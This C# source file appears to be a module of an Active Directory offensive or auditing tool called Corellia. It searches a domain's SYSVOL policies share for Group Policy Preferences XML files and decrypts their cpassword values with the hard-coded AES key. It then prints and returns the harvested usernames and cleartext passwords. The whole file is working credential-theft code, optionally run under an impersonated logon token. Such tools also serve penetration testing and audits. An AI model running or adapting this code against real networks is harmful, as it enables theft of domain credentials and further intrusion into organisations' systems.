using Corellia.Interfaces;
using Corellia.Utilities;
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Xml;

namespace Corellia.Modules
{
    public class GPPPassword : IModules
    {
        private static List<Structure.GPPPassword> gpppasswords = new List<Structure.GPPPassword>();

        public Enums.Mode Mode => Enums.Mode.Domain;

        public static List<Structure.GPPPassword> GetGPPPassword()
        {
            if (Config.CredsPresent())
            {
                IntPtr hToken = Authenticate.SetLogonToken();
                if (hToken != IntPtr.Zero)
                {
                    using (WindowsImpersonationContext context = WindowsIdentity.Impersonate(hToken))
                    {
                        Run();
                    }
                }
                else
                {
                    Logger.Print(Logger.STATUS.ERROR, "Failed to set Token!");
                }
            }
            else
            {
                Run();
            }
            return gpppasswords;
        }

        public static void Run()
        {
            string path = "\\\\" + Config.Domain + "\\sysvol\\" + Config.Domain + "\\policies\\";

            Logger.Print(Logger.STATUS.INFO, "Searching for Groups.xml: " + path);
            try
            {
                ProcessAllFiles(path, ProcessFile);
            }
            catch (Exception e)
            {
                Logger.Print(Logger.STATUS.ERROR, e.Message);
            }
            Console.WriteLine();
        }

        private static string DecryptCPassword(string cPassword)
        {
            int mod = cPassword.Length % 4;
            switch (mod)
            {
                case 1:
                    cPassword = cPassword.Substring(0, cPassword.Length - 1);
                    break;

                case 2:
                    cPassword += "==";
                    break;

                case 3:
                    cPassword += "=";
                    break;
            }

            byte[] aesKey = { 0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8, 0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90, 0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b };
            byte[] aesIV = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

            RijndaelManaged rijn = new RijndaelManaged();

            using (MemoryStream msDecrypt = new MemoryStream(Convert.FromBase64String(cPassword)))
            {
                using (ICryptoTransform decryptor = rijn.CreateDecryptor(aesKey, aesIV))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader swDecrypt = new StreamReader(csDecrypt))
                        {
                            return Encoding.Unicode.GetString((Encoding.UTF8.GetBytes(swDecrypt.ReadToEnd())));
                        }
                    }
                }
            }
        }

        private static List<Structure.GPPPassword> ParseAndPrintProperties(XmlDocument xml, string NodePath, string userAttribute)
        {
            XmlNodeList xnList;
            xnList = xml.SelectNodes(NodePath);
            List<Structure.GPPPassword> gpppasswords = new List<Structure.GPPPassword>();
            foreach (XmlNode xn in xnList)
            {
                try
                {
                    Logger.Print(Logger.STATUS.GOOD, "Username: {0}", xn.Attributes[userAttribute].Value);
                    Logger.Print(Logger.STATUS.GOOD, "Changed:  {0}", xn.ParentNode.Attributes["changed"].Value);
                    Logger.Print(Logger.STATUS.GOOD, "Password: {0}", DecryptCPassword(xn.Attributes["cpassword"].Value));
                    Structure.GPPPassword gpp = new Structure.GPPPassword
                    {
                        Username = xn.Attributes[userAttribute].Value,
                        Changed = xn.ParentNode.Attributes["changed"].Value,
                        Password = DecryptCPassword(xn.Attributes["cpassword"].Value)
                    };
                    if (!gpppasswords.Contains(gpp))
                    {
                        gpppasswords.Add(gpp);
                    }
                }
                catch
                {
                }
            }
            return gpppasswords;
        }

        private static void ProcessFile(string path)
        {
            XmlDocument xml = new XmlDocument();
            try
            {
                xml.Load(path);
            }
            catch
            {
                Logger.Print(Logger.STATUS.ERROR, "Error parsing {0}", path);
                return;
            }
            switch (Path.GetFileName(path).ToLower())
            {
                case "groups.xml":
                    gpppasswords.AddRange(ParseAndPrintProperties(xml, "/Groups/User/Properties", "userName"));
                    break;

                case "services.xml":
                    gpppasswords.AddRange(ParseAndPrintProperties(xml, "/NTServices/NTService/Properties", "accountName"));
                    break;

                case "scheduledtasks.xml":
                    gpppasswords.AddRange(ParseAndPrintProperties(xml, "/ScheduledTasks/Task/Properties", "runAs"));
                    break;

                case "datasources.xml":
                    gpppasswords.AddRange(ParseAndPrintProperties(xml, "/DataSources/DataSource/Properties", "username"));
                    break;

                case "printers.xml":
                    gpppasswords.AddRange(ParseAndPrintProperties(xml, "/Printers/SharedPrinter/Properties", "username"));
                    break;

                case "drives.xml":
                    gpppasswords.AddRange(ParseAndPrintProperties(xml, "/Drives/Drive/Properties", "username"));
                    break;
            }
            return;
        }

        private static void ProcessAllFiles(string folder, Action<string> fileAction)
        {
            foreach (string file in Directory.GetFiles(folder))
            {
                if (file.EndsWith(".xml"))
                {
                    fileAction(file);
                }
            }
            foreach (string subDir in Directory.GetDirectories(folder))
            {
                try
                {
                    ProcessAllFiles(subDir, fileAction);
                }
                catch
                {
                }
            }
        }
    }
}